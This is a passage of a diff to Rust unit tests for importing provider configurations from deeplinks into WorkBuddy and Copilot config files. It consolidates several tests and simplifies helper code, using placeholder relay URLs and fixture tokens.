+    let id = super::import_provider_from_deeplink(&state, req).unwrap();
     assert!(state
         .db
         .get_provider_by_id(&id, &AppType::WorkBuddy)
         .unwrap()
         .is_some());
+    let read_models = || -> serde_json::Value {
+        serde_json::from_str(
+            &std::fs::read_to_string(crate::workbuddy_config::config_path()).unwrap(),
+        )
+        .unwrap()
+    };
+    let written = read_models();
     assert_eq!(
-        read_workbuddy_models_json()["models"],
-        serde_json::json!([{
+        written["models"],
+        json!([{
             "id": "example-model",
             "name": "Example",
             "vendor": "Example",
@@ -2680,42 +1902,14 @@ fn test_workbuddy_link_is_added_to_models_json() {
             "ccSwitchProviderId": id,
         }])
     );
-}
 
-#[test]
-#[serial_test::serial]
-fn test_workbuddy_link_with_the_toggle_off_is_saved_without_touching_models_json() {
-    let home = TempUserHome::new();
-    let _data = EnvVars::new().set("WORKBUDDY_CONFIG_DIR", home.path().join("workbuddy"));
-    let state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
-
-    let id = import_workbuddy_link(&state, Some(false)).expect("import WorkBuddy provider");
-
-    assert!(state
-        .db
-        .get_provider_by_id(&id, &AppType::WorkBuddy)
-        .unwrap()
-        .is_some());
-    assert!(!crate::workbuddy_config::config_path().exists());
-}
-
-/// 同一个模型 id 只能属于一张卡：另一张卡的链接带了同一个模型要报错，且不留下卡片、不改 models.json
-#[test]
-#[serial_test::serial]
-fn test_workbuddy_link_refuses_a_model_another_card_owns() {
-    let home = TempUserHome::new();
-    let _data = EnvVars::new().set("WORKBUDDY_CONFIG_DIR", home.path().join("workbuddy"));
-    let state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
-    import_workbuddy_link(&state, None).expect("first import");
-    let before = read_workbuddy_models_json();
-
+    // 同一个模型 id 已被占用：另一张卡拒绝导入，不改 models.json、不留脏卡片
     let other_card = provider_link("workbuddy", None).replace("name=Example", "name=Other");
-    let request = parse_deeplink_url(&other_card).expect("parse link");
     let err =
-        super::import_provider_from_deeplink(&state, request).expect_err("model id already taken");
-
+        super::import_provider_from_deeplink(&state, parse_deeplink_url(&other_card).unwrap())
+            .expect_err("model id already taken");
     assert!(err.to_string().contains("example-model"), "{err}");
-    assert_eq!(read_workbuddy_models_json(), before);
+    assert_eq!(read_models(), written);
     assert_eq!(
         state
             .db
@@ -2729,8 +1923,6 @@ fn test_workbuddy_link_refuses_a_model_another_card_owns() {
 #[test]
 #[serial_test::serial]
 fn test_copilot_link_writes_a_readable_card_into_providers_json() {
-    use serde_json::json;
-
     let home = TempUserHome::new();
     let copilot_home = home.path().join(".copilot");
     let _copilot = crate::copilot_config::test_support::CopilotHomeGuard::new(&copilot_home);
@@ -2749,8 +1941,7 @@ fn test_copilot_link_writes_a_readable_card_into_providers_json() {
 
     // 卡片 id 是 `/model` 里看得见的前缀：用名字的 slug，撞了加后缀；累加式默认直接写进文件。
     let request = parse_deeplink_url(&provider_link("copilot", None)).expect("parse link");
-    let db = Arc::new(Database::memory().expect("create memory db"));
-    let state = AppState::new(db);
+    let state = AppState::new(Arc::new(Database::memory().expect("create memory db")));
     let first = super::import_provider_from_deeplink(&state, request.clone()).unwrap();
     let second = super::import_provider_from_deeplink(&state, request).unwrap();
     assert_eq!((first.as_str(), second.as_str()), ("example", "example-2"));
@@ -2763,15 +1954,17 @@ fn test_copilot_link_writes_a_readable_card_into_providers_json() {
 #[test]
 #[serial_test::serial]
 fn copilot_inline_links_keep_credentials_and_all_model_ids_after_preview() {
-    use serde_json::json;
     let home = TempUserHome::new();
     let _copilot =
         crate::copilot_config::test_support::CopilotHomeGuard::new(&home.path().join(".copilot"));
     let state = AppState::new(Arc::new(Database::memory().unwrap()));
-    let config = BASE64_STANDARD.encode(json!({
-        "provider":{"baseUrl":"https://relay.example/v1","bearerToken":"bearer-fixture","headers":{"ignored":"header"}},
-        "models":[{"id":"first","systemMessage":{"mode":"replace","content":"ignored"}},{"id":"second"}]
-    }).to_string());
+    let config = BASE64_STANDARD.encode(
+        json!({
+            "provider":{"baseUrl":"https://relay.example/v1","bearerToken":"bearer-fixture","headers":{"ignored":"header"}},
+            "models":[{"id":"first","systemMessage":{"mode":"replace","content":"ignored"}},{"id":"second"}]
+        })
+        .to_string(),
+    );
     for (suffix, key, value, models) in [
         (
             "",
